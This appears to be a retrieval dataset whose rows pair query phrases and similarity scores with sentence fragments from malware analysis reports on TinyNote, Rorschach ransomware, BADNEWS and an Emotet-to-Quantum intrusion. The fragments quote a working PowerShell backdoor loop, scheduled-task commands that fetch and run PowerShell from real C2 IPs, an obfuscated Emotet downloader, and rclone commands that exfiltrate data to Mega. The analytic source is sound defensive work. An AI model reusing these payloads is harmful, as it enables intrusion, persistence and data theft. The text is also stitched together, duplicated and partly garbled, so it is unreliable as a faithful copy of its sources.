($req.ServicePoint.CurrentConnections -ge 10000) { $req.ServicePoint.CloseConnectionGroup("""") } $req.ServicePoint.Expect100Continue = $false; #$req.Timeout = 10000; $req.Method = ""POST""; $req.ContentType = ""application/x-www-form-urlencoded""; $req.ContentLength = $data.Length; $Stream = $req.GetRequestStream(); $Stream.Write($data, 0, $data.Length);$Stream.Flush();$Stream.Close(); #waiting remote [System.Net.WebResponse] $resp = $req.GetResponse();$header=$resp.GetResponseHeader(\'CMD\'); $d = [System.Convert]::FromBase64String($header); $Ds = [System.Text.Encoding]::UTF8.GetString($d);$result = """"; Foreach ($string in invoke-expression $Ds) {$result=$result+\'_n1w_\'+$string;}; $result = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($result)); $postParams = ""result=$result""; } 4/6catch{}; }; The malware then copies itself to the zip file with the name [16 random characters].zip in c:\\\\users\\\\public\\\\, and also creates another copy of itself to the path using the zip name as a folder, for example, c:\\\\users\\\\public\\\\pMiOxI3G44Igrpq7.zip\\\\.', 'Both the file inside the zip and the unzipped copy of the file get the same randomly generated name [5 random characters].exe, for example, 8q3Fj.exe.', 'Finally, the malware creates a scheduled task to execute its copy from this randomized path: schtasks /Create /TN 8NaZrCq3pGeDRXKF /SC MINUTE /MO 15 /TR ""explorer.exe c:\\\\users\\\\public\\\\8NaZrCq3pGeDRXKF.zip\\\\8NaZr.exe"" /f Second mode: the backdoor This mode happens after the malware has achieved persistence and is running from a zip path.', 'First, the malware enumerates the system for the following data and concatenates it to one string: The current system username The current username home folder The systems network interfaces (name, MacAddress, description) Next, it encrypts the string using a simple XOR encryption algorithm with the key NASA and Base64 encodes it afterward.', 'It then picks one random C&C URL out of the three available and constructs a GET request: http://5.188.33.190/api.php http://103.169.90.132/api.php http://103.159.132.91/api.php The encoded enumeration data is stored in a cookie called SSN.', 'Other headers in the request are constructed from serval random values.', 'The hostname header is selected from the following list: The user-agent is also randomized and is selected from the following list: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0 Mozilla/5.0 (iPhone; CPU iPhone OS 12_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1 Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 The expected result from the server is a JSON with the following structure: {""msg"":""[BASE64-ENCODED COMMAND]""} After the validation of the JSON and Base64 decoding, the malware creates a Goroutine that executes the command and continues to listen for more commands in a loop.', 'Attribution In addition to the fact that one of the backdoor versions was found on the Camaro Dragon distribution server, there are other strong connections between the actors and the TinyNote malware: The server 103.159.132[.']"
"the malware creates a scheduled task to execute its copy from this randomized path:

schtasks /Create /TN 8NaZrCq3pGeDRXKF /SC MINUTE /MO 15 /TR ""explorer.exe c:\users\public\8NaZrCq3pGeDRXKF.zip\8NaZr.exe"" /f"|0.753457341901516|"['But in this case, the threat actors decided to use a default class name which allows them to skip calling theRegisterClassfunction prior to callingCreateWindow.', 'Ultimately, creating this window allows the threat actors to bypass the check, as the newly created window is technically visible, and continue the backdoor execution uninterrupted.Figure 3 SmadAV detection on the Go backdoor with the removed bypassSMADAV function.Backdoor execution flowThe malware creates a mutex namedNASA&USAand then continues execution according to one of two modes of operation.First mode: persistence, PowerShell backdoor, and malware installationThe malware checks if there is azipstring in the file path.', 'If this is not found, it continues the execution flow.', 'First, it creates the directoryc:\\\\programdata\\\\Robots.', 'If this fails, the malware does not continue the execution, likely because the infected user only has low privileges.Next, the malware creates 2 scheduled tasks calledtestandtest2to retrieve and execute PowerShell commands, each retrieved fromrobots.txtfrom different C&C servers, most likely to eliminate a single point of failure:schtasks /Create /TN test /SC MINUTE /MO 15 /TR ""powershell \\\\""$r=[System.Net.WebRequest]::Create(\\\\\\\\\\\\""http://5.188.33.190/Robots.txt\\\\\\\\\\\\"");(new-object System.IO.StreamReader(($r.GetResponse()).GetResponseStream())).ReadToEnd() | powershell.exe -noprofile -\\\\"""" /fschtasks /Create /TN test2 /SC MINUTE /MO 45 /TR ""powershell \\\\""$r=[System.Net.WebRequest]::Create(\\\\\\\\\\\\""http://103.159.132.91/Robots.txt\\\\\\\\\\\\"");(new-object System.IO.StreamReader(($r.GetResponse()).GetResponseStream())).ReadToEnd() | powershell.exe -noprofile -\\\\"""" /fAt the time of execution, both servers returned the same code pointing to the third server:C:\\\\Windows\\\\System32\\\\cmd.exe /c ""start powershell.exe -nop -c set-alias exi iex;`$v1=\'iex (new-object net.webclient).dow\';`$v2=\'nloadstring(\'\'http://\';`$v3=\'103.159.132.91/robots1.txt\'\')\';exi(`$v1+`$v2+`$v3);""The final payload returned is a lightweight PowerShell backdoor, which retrieves a list of commands from theCMDheader from the C&C server response, executes them withInvoke-Expression, concatenates the outputs with\'_n1w_\'string, and sends them back to the server in POST request:$WindowState = \'[DllImport(""user32.dll"")] public static extern bool ShowWindow(int handle, int stat);\';add-type -name win -member $WindowState -namespace native;[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0); $url=""http://103.159.132.91:8081/""; $postParams = \'result=start\'; while (1 -eq 1) { try {   $data = [System.Text.Encoding]::UTF8.GetBytes($postParams);   $req = [System.Net.WebRequest]::Create($url);   $req.ServicePoint.ConnectionLimit =65535;   If ($req.ServicePoint.CurrentConnections -ge 10000) {     $req.ServicePoint.CloseConnectionGroup("""")   }   $req.ServicePoint.Expect100Continue = $false;   #$req.Timeout = 10000;   $req.Method = ""POST"";   $req.ContentType = ""application/x-www-form-urlencoded"";   $req.ContentLength = $data.Length;   $Stream = $req.GetRequestStream();   $Stream.Write($data, 0, $data.Length);$Stream.Flush();$Stream.Close();   #waiting remote   [System.Net.WebResponse] $resp = $req.GetResponse();$header=$resp.GetResponseHeader(\'CMD\');   $d = [System.Convert]::FromBase64String($header);   $Ds = [System.Text.Encoding]::UTF8.GetString($d);$result = """";   Foreach ($string in invoke-expression $Ds){$result=$result+\'_n1w_\'+$string;};   $result = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($result));   $postParams = ""result=$result""; } catch{}; };The malware then copies itself to the zip file with the name[16 random characters].zipinc:\\\\users\\\\public\\\\, and also creates another copy of itself to the path using the zip name as a folder, for example,c:\\\\users\\\\public\\\\pMiOxI3G44Igrpq7.zip\\\\.', 'Both the file inside the zip and the unzipped copy of the file get the same randomly generated name[5 random characters].exe, for example,8q3Fj.exe.Finally, the malware creates a scheduled task to execute its copy from this randomized path:schtasks /Create /TN 8NaZrCq3pGeDRXKF /SC MINUTE /MO 15 /TR ""explorer.exe c:\\\\users\\\\public\\\\8NaZrCq3pGeDRXKF.zip\\\\8NaZr.exe"" /fSecond mode: the backdoorThis mode happens after the malware has achieved persistence and is running from a zip path.', 'First, the malware enumerates the system for the following data and concatenates it to one string:The current system usernameThe current username home folderThe systems network interfaces (name, MacAddress, description)Next, it encrypts the string using a simple XOR encryption algorithm with the keyNASAand Base64 encodes it afterward.', 'It then picks one random C&C URL out of the three available and constructs a GET request:http://5.188.33.190/api.php http://103.169.90.132/api.php http://103.159.132.91/api.phpThe encoded enumeration data is stored in a cookie calledSSN.', 'Other headers in the request are constructed from serval random values.', 'Thehostnameheader is selected from the following list:Theuser-agentis also randomized and is selected from the following list:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0Mozilla/5.0 (iPhone; CPU iPhone OS 12_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36The expected result from the server is a JSON with the following structure:{""msg"":""[BASE64-ENCODED COMMAND]""}After the validation of the JSON and Base64 decoding, the malware creates a Goroutine that executes the command and continues to listen for more commands in a loop.AttributionIn addition to the fact that one of the backdoor versions was found on the Camaro Dragon distribution server, there are other strong connections between the actors and the TinyNote malware:The server 103.159.132[.', ']91, where one of the versions of the malware was first found behaves like the C&C server of the backdoor, and was also a delivery server for the MQsTTang backdoor during the same time period.Another C&C server, 103.169.90[.']"
techniques like process hollowing where the process is created in suspend mode and then replaced with malicious code.|0.857059857103919|['When any new process starts in the system, SmadAV scans all available windows.', 'For every problematic window found, the antivirus checks if the window is visible with the API function IsWindowVisible.', 'If the window is visible, it adds this window owners process ID to an array containing all current processes that have at least one visible window: Figure 1 SmadAV code that collects a list of PIDs that have associated windows.', '2/6After iterating over all windows, the antivirus process iterates over this array and compares each process ID to the newly created process ID.', 'If none is found, meaning the new process doesnt have any visible windows, the antivirus deems the newly created process to be malicious and shows a popup that suggests blocking the created process.', 'This flow might act as protection from the techniques like process hollowing where the process is created in suspend mode and then replaced with malicious code.', 'The threat actors appear to have reverse-engineered the logic of smadAV and dealt with this check by creating a window without a window name, but with the class name EDIT which is one of the available default windows class names.', 'The window attributes include a very large number for the X position, the width and height are set to 0, and flags such as WS_EX_TOOLWINDOW define the window as a tool window.', 'These attributes make sure the window is identified as visible by IsWindowVisible function, but in fact, it is not shown to the user and does not appear in the taskbar or when pressing ALT+TAB: Figure 2 A piece of malware code creates a specially crafted window to bypass the smadAV.', 'Before a call to CreateWindowEx, you would usually first need to create a class by calling RegisterClass and then class CreateWindowEx.', 'But in this case, the threat actors decided to use a default class name which allows them to skip calling the RegisterClass function prior to calling CreateWindow.']
was deployed using DLL side-loading|0.7837300037766519|['We also found some known malware families such as PlugX and HyperBro, as well as many custom post-exploitation tools.', 'Below we describe the loading, persistence, and features of the two backdoors.', 'Type 1 Backdoor Loading the Payload This backdoor is written in the C++ language with classes that inherit from virtual classes.', 'The backdoor is also modular, allowing for expansion with the use of plugins.', 'Current Method: DLL Side-Loading To load this backdoor, the threat actor launches the legitimate file MsMpEng.exe, which is signed by Microsoft and described as an Antimalware Service Executable.', 'This executable is vulnerable to DLL side-loading,3 wherein an unintended DLL is loaded on a program.', 'In this case, the malicious actor takes advantage of it by storing a file named mpsvc.dll in the same directory.', 'That DLL then opens a third filename, mpsvc.mui, which contains the obfuscated backdoor, decodes it, and loads it into a svchost.exe process.', 'We found two RAR archive files (detected as Trojan.Win64.CLAMBLING.A) in the wild containing the aforementioned files.', 'The modification time of the embedded files is 2019-07-25.', 'Old Method: Patching of a Legitimate File Interestingly, we observed a different technique being used in an older version of this backdoor.']
was deployed using DLL side-loading|0.7837300037766519|"['No further content was served from lite.php during the investigation.', 'A likely scenario is that the attackers may have wanted to use a Silverlight exploit to execute the malware in the case of a user who does not open or get successfully exploited by the weaponised document.', 'This could have been intended as an exploitation of something like CVE-2016-0034 which is known to have been adopted by exploit kits back in February 2016 and which pre-dates MONSOON.', ""HTTP/1.1 200 OK Date: Fri, 27 May 2016 22:32:29 GMT Server: Apache X-Powered-By: PHP/5.5.12 Content-Length: 749 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html <script>function hasSilverlightPlugin() { var slplugin = false; var browser = navigator.appName; // Get the browser type if (browser == 'Microsoft Internet Explorer') { try { var slControl = new ActiveXObject('AgControl.AgControl'); if (slControl) { slplugin = true; } } catch (e) { } } else { // Netscape, FireFox, Google chrome etc try { if (navigator.plugins['Silverlight Plug-In']) { slplugin = true; } } catch (e) { } } return slplugin; } var javascriptVariable = hasSilverlightPlugin(); window.location.href = 'lite.php?name='+javascriptVariable; </script> Figure 19 Silverlight Profiling MONSOON ANALYSIS OF AN APT CAMPAIGN Revision: 1.07 | TLP-WHITE | 21/57Forcepoint Security Labs | Special Investigations BADNEWS MALWARE The BADNEWS malware is capable of arbitrary command execution, screenshots, self-updating, downloading and executing files, and directory listings."", 'The name was given due to its use of RSS feeds, forums, blogs and Dynamic DNS providers for its C&C infrastructure.', 'BADNEWS uses a DLL side-loading technique with a signed Java binary in order to evade security solutions.', 'It is a first stage malware that is likely to receive second stage malware components if the target is of interest, although we did not observe this behaviour.', 'DLL Side-Loading.', 'The BADNEWS DLL is typically side-loaded into a legitimate signed Java executable.', ""A specific weaponised document analysed10 drops a binary blob and an encoded VBScript file which then extracts a decoy document along with the following 3 files: MicroScMgmt.exe msvcr71.dll jli.dll MicroScMgmt.exe is a renamed version of the legitimate Java Runtime's 6.0.390.4 binary named java- rmi.exe and is signed by Sun Microsystems."", 'This application requires the legitimate msvcr71.dll and also requires a DLL named jli.dll.']"
was deployed using DLL side-loading|0.7837300037766519|"[']ua"", ,    .', ', , 08.11.2022  .', 'RAR- ""shahed-136.rar"",  PPSX- ""shahed.ppsx"", ,  , VBScript-,   ,  ,   PowerShell-.', ',    RC4,   ,    ""Manager""  ("" |shahed.ppsx"").', 'PowerShell-  BitsTransfer (Background Intelligent Transfer Management)   ""WibuCm32.dll"", ""CodeMeter.exe"" ( ),    .', ',  DLL Side-Loading.', '""WibuCm32.dll""   DolphinCape,    Delphi     (\' , \' , , ,  ), EXE/DLL ,   ,    .', 'UAC-0140.', ': 247997c2b4431585f9355d3324410298 460244cbf353b15b52c69952dd3b2549de79c590c56807bc25d4896dd0016655 shahed- 136.rar 241e4285a84be65cf16778462f06b9a8 5137a888271b08f388d863433e5f0f1b129e15d4c812b95c831e93e27ec45bd6 1/3shahed.ppsx 3444e86aefa7bc2dbce34903f805400d 6ee62645cd97fb0b41fdf219b9a2a8211324ded110b5c7f09b3d9881abb2a594 SearchEmbdIndex.ps1 142893c48b76b7e9d0f7ce74e16aaf1f 2c1a2fe3fb418601f3adc9256e1ff2c509178483fdbb0e964f52fb6b30be1129 CodeMeter.exe 98c3d5347842743bfb4ade50b39226c1 772654b186ad9fbd0a80f03ceae7d327b45c8944452cc39048160b1f6d8f2672 WibuCm32.dll (2022-09-24 06:09:32) (DolphinCape) : morgunov.a@dsns.com.ua 195[.', ']123.237.147 202[.', ']157.187.190 Mozilla/3.0 (compatible; Indy Library) dsns.com[.']"
It makes direct system calls using the “syscall” instruction.|1.0000000000000002|"['First, the initial loader/injectorwinutils.dllis protected with UPX-style packing.', 'However, this is changed in such a way that it isnt readily unpacked using standard solutions and requires manual unpacking.', 'After unpacking, the sample loads and decryptsconfig.ini, which contains the ransomware logic.After Rorschach is injected intonotepad.exe, its still protected by VMProtect.', 'This results in a crucial portion of the code being virtualized in addition to lacking an IAT table.', 'Only after defeating both of these safeguards is it possible to properly analyze the ransomware logic.Security Solution EvasionAlthough Rorschach is used solely for encrypting an environment, it incorporates an unusual technique to evade defense mechanisms.', 'It makes direct system calls using the syscall instruction.', 'While previously observed in other strains of malware, its quite startling to see this in ransomware.The procedure involves utilizing the instruction itself, and it goes as follows:The ransomware finds the relevant syscall numbers for NT APIs, mainly related to file manipulation.Rorschach then stores the numbers in a table for future use.When needed, it calls a stub routine that uses the number directly with the syscall instruction instead of using the NT API.In other words, the malware first creates a syscall table for NT APIs used for file encryption:Figure 3 Creation of syscall table for certain NT APIs.The end of the table is a section with the relevant syscall numbers:Figure 4 Section containing the syscall table.The example below shows how the syscall numbers are used:Figure 5 Example use of direct syscall.This obfuscated process is not required for the ransomware encryption logic, which suggests it was developed to bypass security solutions monitoring direct API calls.Command Line ArgumentsIn addition to the hardcoded configuration, the ransomware comes with multiple built-in options, probably for the operators comfort.', 'All of them are hidden, obfuscated, and not accessible without reverse-engineering the ransomware.', 'This table contains some of the arguments that we discovered:ArgumentExample ParameterDescriptionrun=1234Password needed to run the sample, possibly built on demand.nomutex=1Do not create a mutex, therefore do not insure that only a single instance is running.log=1Create log files.nodel=0Do not self-delete on execution.path=C:Encrypt only the following path.noshare=1Do not encrypt shares.pt=C:.dllExplicitly state the loader DLL.cg=C:.iniExplicitly state the configuration file that stores the malware.we=C:.exeExplicitly state the main executable.diskpart=1Rundiskpart.exe /s AppData_x.txtthat removes read- only volume attributes.nobk=1Do not change the wallpaper of the infected machine.thread=4Number of threads per CPU.at=2023/03/24 05:04:20Activation time (trigger time).nomail=1Do not create a ransom note.This is only a partial list, with additional arguments suggesting networking capabilities, such aslisten,srvandhostfile.Example of how some of these arguments are used:cy.exe --run=1234 --nomutex=0 --log=1 --nodel=1 --path=""C:\\\\Myfolder"" --full=1 --diskpart=1 --nobk=0Language Based ProtectionBefore encrypting the target system, the sample runs two system checks that can halt its execution:It usesGetSystemDefaultUILanguageandGetUserDefaultUILanguageto determine what language the user is using.It exits if the return value is commonly used in CIS countries:{   0x042b: ""Armenian_Armenia"",   0x042c: ""Azeri_Latin"",   0x043f: ""Kazakh"",   0x082c: ""Azeri_Cyrillic"",   0x419: ""Russian"",   0x422: ""Ukrainian"",   0x423: ""Belarusian"",   0x428: ""Tajik"",   0x437: ""Georgian"",   0x440: ""Kyrgyz_Cyrillic"",   0x442: ""Turkmen"",   0x443: ""Uzbek_Latin"",   0x819: ""Russian_Moldava"",   0x843: ""Uzbek_Cyrillic"" }Encryption ProcessThe Rorschach ransomware employs a highly effective and fast hybrid-cryptography scheme, which blends thecurve25519and eSTREAM cipherhc-128algorithms for encryption purposes.', 'This process only encrypts a specific portion of the original file content instead of the entire file.', 'The WinAPICryptGenRandomis utilized to generate cryptographically random bytes used as a per-victim private key.']"
ipconfig|0.7876146142077466|['1.3.4      ,  474  .', '1.3.5        .', '1.3.6   ,    ,  474  ( ).', '1.3.7     15.210-2001 (   ) - ,  .', '1.3.8   .', '.', ',      , .', '1.3.9     .', ':   -   -  ;    ,  .', '1.3.10  ()  , .', '.']
Tactical RMM is a remote management software platform that uses a combination of agents to allow for remote management and access to systems.|0.7821506826718181|"['The script will decode itself rather than depend on Powershells built-in ability to execute encoded scripts...\\\\..\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -c ""&{\'p8ArwZsj8ZO+Zy/dHPeI+siGhbaxtEhzwmd3zVObm9uG2CGKqz5m4AdzKWWzPmKrjJieG4O9\';$BxQ=\'uYnIvc3RhdHMvUkppMnJRSTRRWHJXQ2ZnZG1pLyIsImh0dHBzOi8vd3d3LmVsYWJvcm8ucGwvaW1ncy9KWkgyR0lIdG9PNy8iLCJodHRwczovL2 VsLWVuZXJnaWFraS5nci93cC1pbmNsdWRlcy9JZHJWS09HWU1Rb2R1N0lsT0loLyIsImh0dHA6Ly9kcmVjaHNsZXJzdGFtbXRpc2NoLmRlL2ZvbnRzL1pBeVhic2YvIiwiaHR0cDovL2RobmNvbnN0cnVjY2lvbmVzLmNvbS5hci93cC1hZG1pbi9TbTAyWnNWRFlXZG9UYjdycUw vIiwiaHR0cDovL2RpbHNybC5jb20vcGhvbmUvcGZpcDVtLyIpOyR0PSJuZldGUSI7JGQ9IiRlbnY6VE1QXC4uXCR0Ijtta2RpciAtZm9yY2UgJGQgfCBvdXQtbnVsbDtmb3JlYWNoICgkdSBpbiAkbGlua3MpIHt0cnkge0lXUiAkdSAtT3V0RmlsZSAkZFxqeEtQSXJNRnhKLk9P ZjtSZWdzdnIzMi5leGUgIiRkXGp4S1BJck1GeEouT09mIjticmVha30gY2F0Y2ggeyB9fQ==\';$KOKN=\'ICBXcml0ZS1Ib3N0ICJBcFBoUiI7JFByb2dyZXNzUHJlZmVyZW5jZT0iU2lsZW50bHlDb250aW51ZSI7JGxpbmtzPSgiaHR0cHM6Ly9kZXNjb250YWRvci5jb20\';$KO KN=$KOKN+$BxQ;$GBUus=$KOKN;$xCyRLo=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($GBUus));$GBUus=$xCyRLo;iex($GBUus)}""The Powershell script, when double clicked (executed), will attempt to connect to a set of domains containing the Emotet malware.', 'Upon successful download of the Emotet malware, the PowerShell script will write it to a temporary directory and execute the payload viaregsvr32.exe.It is interesting to note, the LNK identifies the machine it was created on through the NetBIOS name ofblack-dogand a MAC Address beginning with08:00:27indicating asystem running on Virtualbox.Machine ID: black-dog MAC Address: 08:00:27:c6:74:5d MAC Vendor: PCS SYSTEMTECHNIK Creation: 2022-05-12 15:33:49Once the PowerShell script from the LNK file executed successfully, Emotet began execution.', 'Emotet will initially copy itself to a randomly named folder in the users temporary folder.Multiple instances of Emotet spawning itself was observed over a period of three days.', 'Almost all the instances of Emotet included three enumeration commands executed:systeminfo ipconfig /all nltest /dclist:Towards the third and fourth day of the intrusion, Cobalt Strike was dropped to disk as a PE executable and executed.', 'This access was used to perform enumeration and move laterally to other hosts.The following diagram aims to provide an illustration of the execution chain with multiple instances of Emotet leading to Cobalt Strike.The Emotet malware has used various persistence methods over time, an example can be seenhere.On the first day, Emotet established persistence via a run key.As we can see, theregsvr32.exeWindowss native utility was used to launch the Emotet DLL.After moving to the hands on keyboard phase of the intrusion, the threat actors proceeded to deploy several remote management tools across the environment.Tactical RMMwas the first tool chosen for deployment.', 'Tactical RMM is a remote management software platform that uses a combination of agents to allow for remote management and access to systems.The file17jun.exe,was deployed into the programdata folder on one of the servers.', 'This was then executed by the threat actors and resulted in the installation of the main RMM agent.', 'The install completed with the following command.', '""C:\\\\Program Files\\\\TacticalAgent\\\\tacticalrmm.exe"" -m install --api https://api.floppasoftware[.', ']com --client-id 1 --site-id 1 --agent-type server --auth 5bc5f5263224697ff9a653f8efa7e7d7a2ce341920a03c60e4823331b2508cA service was also created for the agent.Event 7045A service was installed in the system.Service Name: TacticalRMM Agent ServiceService File Name: ""C:\\\\Program Files\\\\TacticalAgent\\\\tacticalrmm.exe"" -m svcService Type: user mode serviceService Start Type: auto startService Account: LocalSystemAlong with thetacticalrmm.execlient, a second executable calledmeshagent.exe,was installed to handle remote session interaction, and a separate service was created for that agent.Event 7045A service was installed in the system.Service Name: Mesh AgentService File Name: ""C:\\\\Program Files\\\\Mesh Agent\\\\MeshAgent.exe""Service Type: user mode serviceService Start Type: auto startService Account: LocalSystemOn the final day of the intrusion, the threat actors added AnyDesk to the same server running Tactical RMM, providing an additional means of access prior to the deployment of ransomware.Event 7045A service was installed in the system.Service Name: AnyDesk ServiceService File Name: ""C:\\\\Program Files (x86)\\\\AnyDesk\\\\AnyDesk.exe"" --serviceService Type: user mode serviceService Start Type: auto startService Account: LocalSystemWe suspect a failed ZeroLogon exploit was attempted against a domain controller, originating from the beachhead host with Cobalt Strike running on it.', 'One indicator is the mimikatz string in the Netlogon event that is used by the Mimikatz Zerologon implementation.During a period of a few seconds, multiple NetrServerReqChallenge and NetrServerAuthenticate2 methods in the traffic from a single source were observed, this isone of the indicatorsof a Zerologon attempt.Process InjectionThe threat actor was observed process injecting into legitimate process and using them to execute their own tasks on the system, this can be seen from Winlogon connecting to a domain associated with a Cobalt Strike server and removing files from the system.The specific mechanism used to inject into a foreign process, was injecting arbitrary code into its memory space, and executing it as a remotely created thread.']"
Using this RMM agent they proceeded to install AnyDesk on the host.|1.0000000000000002|"[']com""  },  ""beacontype"": [   ""HTTP""  ],  ""license_id"": ""206546002"",  ""jitter"": ""37"",  ""sleeptime"": ""45000"",  ""http_get"": {   ""server"": {    ""output"": [     ""print"",     ""append 1522 characters"",     ""prepend 84 characters"",     ""prepend 3931 characters"",     ""base64url"",     ""mask""    ]   },   ""client"": {    ""metadata"": [],    ""headers"": []   },   ""verb"": ""GET"",   ""uri"": ""/jquery-3.3.1.min.js""  },  ""cfg_caution"": false,  ""host_header"": """",  ""crypto_scheme"": ""0"",  ""http_post"": {   ""client"": {    ""output"": [],    ""id"": [],    ""headers"": []   },   ""verb"": ""POST"",   ""uri"": ""/jquery-3.3.2.min.js""  } }Tactical RMM AgentThe threat actor dropped a Tactical RMM Agent on one of the servers as an alternative command and control avenue to access the network.', 'During the installation of the software, the following command was observed:""C:\\\\Program Files\\\\TacticalAgent\\\\tacticalrmm.exe"" -m install --api https://api.floppasoftware[.', ']com --client-id 1 --site-id 1 --agent-type server --auth REDACTEDThis command reveals thefloppasoftware.comdomain used by the threat actor for the remote management of Tactical RMM Agent.', 'This domain was registered very close to the timeline of this incident.A domain registered to be used with Tactical RMM Agent will have both anapiandmeshsubdomain, in this caseapi.floppasoftware[.]comandmesh.floppasoftware[.]com.', 'These were both hosted on the same server IP: 212.73.150.62.In addition, during the execution of Tactical RMM Agent, the software will reach out to a centralized domain in order to retrieve the current public IP address in use:icanhazip.tacticalrmm.ioAnyDeskOn the final day of the intrusion, AnyDesk was deployed on the server they had previously installed Tactical RMM on.', 'Using this RMM agent they proceeded to install AnyDesk on the host.', 'The following process activity was observed from meshagent.exe.MeshAgent.exe -kvm1 - Initiating Process File Name, column 6, row 12 ""MeshAgent.exe"" -b64exec cmVxdWlyZSgnd2luLWNvbnNvbGUnKS5oaWRlKCk7cmVxdWlyZSgnd2luLWRpc3BhdGNoZXInKS5jb25uZWN0KCczNzQ3Jyk7The decoded base 64 content reveals commands for console access and connect actions.This is then followed by the following process flow:Once downloaded and installed, the threat actor initiated a connection to the AnyDesk host.Client-ID: 752733537 (FPR: 27ac27e2c9ed) Logged in from 84.17.49.114:1249Also seen in ourlast report on Emotet, threat actors leveraged Rclone to exfiltrate data to Mega (Mega.nz) storage services.rclone.exe copy ""\\\\\\\\SERVER.domain.name\\\\path"" mega:1 -q --ignore-existing --auto-confirm --multi-thread-streams 6 --transfers 6 rclone.exe copy ""\\\\\\\\SERVER.domain.name\\\\path"" mega:2 -q --ignore-existing --auto-confirm --multi-thread-streams 6 --transfers 6From the rclone.conf file, the threat actors left the details of the remote account being used.', '[emailprotected]With the help of Netflow, we identified that at least ~250MB worth of data was exfiltrated out of the environment.Spam EmailDuring the first two days, Emotet sent outbound spam emails over SMTP:The following is an example of the SMTP traffic for sending the email, along with an extracted EML that was sent with an attached XLS:RansomwareTowards the last day of the intrusion, the threat actor made their preparations to deploy ransomware to the domain.', 'They started by connecting to a new server via RDP from the server they just usedTactical RMMto deploy Anydesk.', 'Once establishing the RDP connection, they deployedPowertool64.exe,likely to prevent intervention by any security tools and launched the softwareDont Sleep.Dont Sleep has the capability to keep the computer from being shutdown and the user from being signed off.', 'This was likely done to ensure nothing will interfere with the propagation of the ransomware payload.Finally, with Dont Sleep running, the threat actor executed a batch script named 1.bat.']"
Tactical RMM Agent was installed by the threat actor on a server to ensure remote access|0.8064844729326126|[']com  Emotet C2 Servers 103.159.224.46 103.75.201.2 119.193.124.41 128.199.225.17 131.100.24.231 139.59.60.88 144.217.88.125 146.59.226.45 149.56.131.28 159.89.202.34 165.22.211.113 165.227.166.238 178.128.82.218 209.126.98.206 213.32.75.32 37.187.115.122 45.226.53.34 45.55.134.126 46.55.222.11 51.210.176.76 51.254.140.238 54.37.70.105 82.223.82.69 91.207.181.106 92.114.18.20 94.23.45.86 96.125.171.165  Cobalt Strike 139.60.161.167 (survefuz[.', ']com) 139.60.160.18 (juanjik[.', ']com)  Tactical RMM Agent api.floppasoftware[.', ']com mesh.floppasoftware[.', ']com 212.73.150.62ComputedK-1 06.13.2022.lnk de7c4da78a6cbba096e32e5eecb00566 02b4f495e9995cc2251c19cd9984763f52122951 1bf9314ae67ab791932c43e6c64103b1b572a88035447dae781bffd21a1187ad  17jun.exe 0ea68856c4f56f4056502208e97e9033  b80c987c8849bf7905ea8f283b79d98753e3c15a  41e230134deca492704401ddf556ee2198ef6f32b868ec626d9aefbf268ab6b1   dontsleep.exe 50cc3a3bca96d7096c8118e838d9bc16  b286b58ed32b6df4ecdb5df86d7d7d177bb7bfaf  f8cff7082a936912baf2124d42ed82403c75c87cb160553a7df862f8d81809ee   locker.dll d2df4601c8d43e655163c0b292bc4cc9  f6727d5d04f2728a3353fbd45d7b2cb19e98802c 6424b4983f83f477a5da846a1dc3e2565b7a7d88ae3f084f3d3884c43aec5df6   netscan.exe 27f7186499bc8d10e51d17d3d6697bc5  52332ce16ee0c393b8eea6e71863ad41e3caeafd  18f0898d595ec054d13b02915fb7d3636f65b8e53c0c66b3c7ee3b6fc37d3566   rclone.exe 22bbe1747933531e9c240e0db86268e2  c2a8776e21403eb00b38bfccd36d1c03dffb009e  53ae3567a34097f29011d752f1d3afab8f92beb36a8d6a5df5c1d4b12edcBehavioralThe threat actor delivered Emotet via a Emotet loader in the form of a LNK file responsible for dropping Emotet via Powershell (K-1 06.13.2022.lnk).', 'Tactical RMM Agent was installed by the threat actor on a server to ensure remote access (17jun.exe).', 'Data was exfiltrated to Mega cloud service via Rclone (rclone.exe).', 'Network mapping was performed using SoftPerfect Network Scanner (netscan.exe) followed by Quantum ransomware execution and propagation in the network (locker.dll).', 'The threat actor kept the remote desktop session alive by running a program to keep the session active (dontsleep.exe)NetworkThe DFIR Report Cobalt Strike 139.60.160.18The DFIR Report Cobalt Strike 139.60.161.167ET Threatview.io High Confidence Cobalt Strike C2 IP group 1 ET POLICY SMB2 NT Create AndX Request For an Executable File ET POLICY SMB Executable File Transfer ET RPC DCERPC SVCCTL - Remote Service Control Manager Access ET INFO Observed External IP Lookup Domain (icanhazip .com in TLS SNI)t ET JA3 HASH - Possible Rclone Client Response (Mega Storage) ET POLICY HTTP POST to MEGA Userstorage ET POLICY SMB Executable File Transfer ET POLICY SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement ET POLICY SMB2 NT Create AndX Request For an Executable File ET POLICY SSL/TLS Certificate Observed (AnyDesk Remote Desktop Software) ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection ET USER_AGENTS AnyDesk Remote Desktop Software User-Agent ET CNC Feodo Tracker Reported CnC Server group 1 ET CNC Feodo Tracker Reported CnC Server group 14 ET CNC Feodo Tracker Reported CnC Server group 15 ET CNC Feodo Tracker Reported CnC Server group 17 ET CNC Feodo Tracker Reported CnC Server group 19 ET CNC Feodo Tracker Reported 